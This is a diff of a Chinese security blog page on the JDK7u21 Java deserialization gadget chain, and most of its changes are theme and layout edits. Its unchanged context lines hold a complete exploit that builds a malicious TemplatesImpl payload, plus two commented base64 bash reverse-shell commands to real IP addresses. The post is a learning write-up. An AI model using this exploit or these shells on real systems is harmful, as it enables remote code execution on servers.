@@ -3,14 +3,28 @@
 <head>
   <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="theme-color" content="#f7f7f4">
-<meta name="color-scheme" content="light">
+<meta name="color-scheme" content="light dark">
+<meta name="theme-color" content="#f7f7f4" data-theme-color-light="#f7f7f4" data-theme-color-dark="#161614">
 
 <title>JDK7u21 — CurlySean&#39;s Blog</title>
 <meta name="description" content="这里是 CurlySean 的个人技术博客，记录漏洞研究、代码审计与攻防实践，整理可以复现、验证与继续推演的技术细节。">
-<link rel="canonical" href="http://curlysean.github.io/2025/08/19/JDK7u21/">
+<link rel="canonical" href="https://curlysean.github.io/2025/08/19/JDK7u21/">
+<link rel="preload" href="/fonts/instrument-sans-latin-wght-normal.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/jetbrains-mono-latin-wght-normal.woff2" as="font" type="font/woff2" crossorigin>
 <link rel="stylesheet" href="/css/style.css">
-<script>document.documentElement.classList.add('js')</script>
+<script>
+  (function () {
+    try {
+      var key = 'sheepfold-theme';
+      var saved = localStorage.getItem(key);
+      var dark = saved === 'dark' || (saved !== 'light' && window.matchMedia('(prefers-color-scheme: dark)').matches);
+      document.documentElement.setAttribute('data-theme', dark ? 'dark' : 'light');
+      document.documentElement.classList.add('js');
+    } catch (error) {
+      document.documentElement.classList.add('js');
+    }
+  })();
+</script>
 
 <meta name="generator" content="Hexo 7.3.0"></head>
 <body class="page-type-post">
@@ -37,11 +51,18 @@
         <a class="desktop-nav__link" href="/about/">关于</a>
       
     </nav>
-    <a class="header-cta" href="/archives/">开始阅读 <span aria-hidden="true">↗</span></a>
-    <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="mobile-menu" data-menu-toggle>
-      <span class="sr-only">打开导航</span>
-      <span></span><span></span>
-    </button>
+    <div class="site-header__actions">
+      <button class="theme-toggle" type="button" data-theme-toggle aria-label="切换颜色模式" title="切换颜色模式">
+        <span data-theme-toggle-label>暗色</span>
+      </button>
+      
+        <a class="header-cta header-cta--ghost" href="/archives/">全部文章 <span aria-hidden="true">↗</span></a>
+      
+      <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="mobile-menu" data-menu-toggle>
+        <span class="sr-only">打开导航</span>
+        <span></span><span></span>
+      </button>
+    </div>
   </div>
   <nav class="mobile-nav" id="mobile-menu" aria-label="移动端主导航" data-mobile-menu>
     <div class="frame mobile-nav__inner">
@@ -90,12 +111,6 @@
         
       </div>
     </div>
-    <div class="frame post-meta-grid reveal">
-      <div><span>发布</span><time datetime="2025-08-18T17:10:23.000Z">2025.08.19</time></div>
-      <div><span>更新</span><time datetime="2025-08-18T17:10:23.000Z">2025.08.19</time></div>
-      <div><span>阅读</span><strong>21 MIN</strong></div>
-      <div><span>标签</span><strong>1</strong></div>
-    </div>
   </header>
 
   <div class="frame post-content-layout">
@@ -103,13 +118,19 @@
       <div class="post-rail__inner">
         <p class="eyebrow">ON THIS PAGE</p>
         
-          <nav class="toc" aria-label="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#A7qn1"><span class="toc-text">JDK7u21</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sO9xT"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lYd5H"><span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NfhLW"><span class="toc-text">JDK7u21攻击链分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#gRDHZ"><span class="toc-text">JDK7u21的核心</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#k236u"><span class="toc-text">调用equalsImpl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OWuAr"><span class="toc-text">找到equals方法调用链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ROf3R"><span class="toc-text">巧用Magic Number</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PI7Ee"><span class="toc-text">小结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jK1F3"><span class="toc-text">EXP编写（不是很会，拿来主义）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xWsrF"><span class="toc-text">断点调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LX8gx"><span class="toc-text">小结</span></a></li></ol></li></ol></nav>
+          <nav class="toc" aria-label="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sO9xT"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lYd5H"><span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NfhLW"><span class="toc-text">JDK7u21攻击链分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#gRDHZ"><span class="toc-text">JDK7u21的核心</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#k236u"><span class="toc-text">调用equalsImpl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OWuAr"><span class="toc-text">找到equals方法调用链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ROf3R"><span class="toc-text">巧用Magic Number</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PI7Ee"><span class="toc-text">小结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jK1F3"><span class="toc-text">EXP编写（不是很会，拿来主义）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xWsrF"><span class="toc-text">断点调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LX8gx"><span class="toc-text">小结</span></a></li></ol></nav>
         
       </div>
     </aside>
     <div class="article-column">
+      <div class="post-meta-grid reveal">
+        <div><span>发布</span><time datetime="2025-08-18T17:10:23.000Z">2025.08.19</time></div>
+        <div><span>更新</span><time datetime="2025-08-18T17:10:23.000Z">2025.08.19</time></div>
+        <div><span>阅读</span><strong>约 9 分钟</strong></div>
+        <div><span>标签</span><strong>1</strong></div>
+      </div>
       <div class="article-body">
-        <h1 id="A7qn1">JDK7u21</h1>
+        
 <h2 id="sO9xT">前言</h2>
 好久之前的文章了，忘记发了
 
@@ -214,22 +235,22 @@ JDK7u21的核心点就是`sun.reflect.annotation.AnnotationInvocationHandler`
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.source;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jdk</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Drunkbaby&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="comment">// new String[]&#123;\&quot;/bin/bash\&quot;, \&quot;-c\&quot;, \&quot;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuNzkuMC4xNjQvMTIzNiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;&#125;&quot;</span></span><br><span class="line">        <span class="type">byte</span>[] evil = getTemplatesImpl(<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;evil&#125;;</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">evilHashCode</span> <span class="operator">=</span> <span class="string">&quot;f5a5a608&quot;</span>;</span><br><span class="line">        <span class="comment">// 实例化一个map，并添加Magic Number为key，也就是f5a5a608，value先随便设置一个值</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(evilHashCode,<span class="string">&quot;sean&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 下面部分搞动态代理，反射获取 AnnotationInvocationHandler 类，再实例化</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">handler</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> handler.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Templates.class, hashMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建动态代理</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Templates</span> <span class="variable">proxy</span> <span class="operator">=</span> (Templates) Proxy.newProxyInstance(jdk.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, invocationHandler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 准备入口类 LinkedHashSet</span></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>();</span><br><span class="line">        hashSet.add(templates);</span><br><span class="line">        hashSet.add(proxy);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将恶意templates设置到map中</span></span><br><span class="line">        hashMap.put(evilHashCode, templates);</span><br><span class="line">        serialize(hashSet);</span><br><span class="line">        deserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getTemplatesImpl(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="comment">// &quot;new String[]&#123;\&quot;/bin/bash\&quot;, \&quot;-c\&quot;, \&quot;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMC4xMS4yMzEvOTk5MCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;&#125;&quot;</span></span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>有些地方暂时不是很会，别的师傅EXP中所写的 <strong>创建类 并读取字节</strong> 的方法，后续会补起来的</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741860627083-9dd9757f-e65a-4d1f-b407-2383a59d59c1.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741860627083-9dd9757f-e65a-4d1f-b407-2383a59d59c1.png" alt="JDK7u21" loading="lazy"></p>
 <h2 id="xWsrF">断点调试</h2>
 
 <p>我们在<code>HashSet</code>的<code>readObject</code>方法中下一个断点</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743591056600-02e0d8fd-efc9-415e-bba0-1e5bc994df8e.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743591056600-02e0d8fd-efc9-415e-bba0-1e5bc994df8e.png" alt="JDK7u21" loading="lazy"></p>
 <p>第一次进入<code>HashMap#put</code>方法，其中table值为空，我们就无法遍历，只能向下走入<code>addEntry</code>方法，经过该方法后，table中不为空</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743591115248-88ba40d4-9d0d-4bb0-a873-1ffe007ae9fd.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743591115248-88ba40d4-9d0d-4bb0-a873-1ffe007ae9fd.png" alt="JDK7u21" loading="lazy"></p>
 <p>第二次进入<code>put</code>方法后，由于我们构造的MagicNumber，现在能够成功走到<code>key.equals</code>方法处</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743591332646-9d600536-cd71-4afd-8f72-e1b254827d18.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743591332646-9d600536-cd71-4afd-8f72-e1b254827d18.png" alt="JDK7u21" loading="lazy"></p>
 <p>由于key为一个<code>Proxy</code>类，因此在调用key的<code>equals</code>方法时，我们发现就会进入到<code>AnnotationInvocationHandler</code>的<code>invoke</code>方法中</p>
 <p>这里由于调用方法为<code>equals</code>，且参数只有一个，所以能够进入到if代码块中，调用<code>equalsImpl</code>方法</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743591404870-7cdb8333-0f7b-4071-98b5-16c7d8a159e6.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743591404870-7cdb8333-0f7b-4071-98b5-16c7d8a159e6.png" alt="JDK7u21" loading="lazy"></p>
 <p>进入<code>equalsImpl</code>内，第一次循环时，我们就看到<code>methodName</code>为<code>newTransformer</code>方法，这里通过反射调用该方法，就触发我们后续的攻击链</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743591635131-49481cd4-6c62-49cd-99c7-4fe27914d589.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743591635131-49481cd4-6c62-49cd-99c7-4fe27914d589.png" alt="JDK7u21" loading="lazy"></p>
 <p>后续的分析之前有说过，所以这里不再过多赘述</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743591751189-c6a5362a-2a94-425e-a2b2-7906d2dce61a.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743591751189-c6a5362a-2a94-425e-a2b2-7906d2dce61a.png" alt="JDK7u21" loading="lazy"></p>
 <h2 id="LX8gx">小结</h2>
 
 <p>感觉很神奇的一条链子，看起来有种CTF的感觉</p>
@@ -248,13 +269,13 @@ JDK7u21的核心点就是`sun.reflect.annotation.AnnotationInvocationHandler`
   <nav class="frame post-navigation" aria-label="相邻文章">
     
       <a href="/2025/08/19/RMI%E5%9F%BA%E7%A1%80/">
-        <span>← PREVIOUS</span>
+        <span>更新一篇</span>
         <strong>RMI基础</strong>
       </a>
     
     
-      <a href="/2025/08/15/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/">
-        <span>NEXT →</span>
+      <a class="post-navigation__older" href="/2025/08/15/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/">
+        <span>更早一篇</span>
         <strong>Redis未授权</strong>
       </a>
     
@@ -268,9 +289,9 @@ JDK7u21的核心点就是`sun.reflect.annotation.AnnotationInvocationHandler`
       <a href="/">CURLYSEAN</a>
       <span>持续记录，保持验证。</span>
     </div>
-    <p class="site-footer__copyright">© 2026 CurlySean</p>
+    <p class="site-footer__copyright">© 2025–2026 CurlySean</p>
     <nav class="site-footer__links" aria-label="外部链接">
-      <a href="https://github.com/CurlySean" target="_blank" rel="noopener">GitHub ↗</a>
+      <a href="https://github.com/CurlySean" target="_blank" rel="noopener noreferrer">GitHub ↗</a>
       <a href="mailto:5345414e@gmail.com">Email ↗</a>
     </nav>
   </div>
